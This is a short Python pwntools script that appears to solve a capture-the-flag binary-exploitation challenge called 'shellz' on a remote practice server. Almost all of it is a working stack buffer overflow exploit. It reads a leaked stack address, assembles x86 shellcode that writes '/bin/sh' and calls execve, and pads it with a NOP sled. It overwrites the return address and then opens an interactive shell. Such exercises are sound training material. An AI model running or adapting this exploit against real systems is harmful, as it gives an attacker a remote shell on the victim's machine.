from pwn import *
import re

# p = process("./shellz")
p = remote('plsdonthaq.me', 3002)

p.recvuntil(b"Here is a random stack address: ")
stackAddress = int(p.recvline(keepends=False), 16)
print("Stack address:", hex(stackAddress), "->", p32(stackAddress))

assembly = f"""
   # Test our shellcode is running
   # mov eax, 1
   # mov ebx, 99
   # int 0x80

   # Store "/bin/sh" at the start of the buffer
   # push didn't work for some reason
   mov ebx, {stackAddress}
   mov edx, 0x6e69622f
   mov [ebx], edx
   mov edx, 0x0068732f
   mov [ebx+4], edx

   # Set up syscall for execve("/bin/sh", NULL, NULL)
   mov eax, 0x0b
   # mov ebx, {stackAddress}
   mov ecx, 0
   mov edx, 0
   int 0x80
"""

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))

#                     Christmas                 + Payload + Return address
payload = (b'\x90' * (0x2008 - len(payload))) + payload + p32(stackAddress)

p.sendline(payload)
p.interactive()
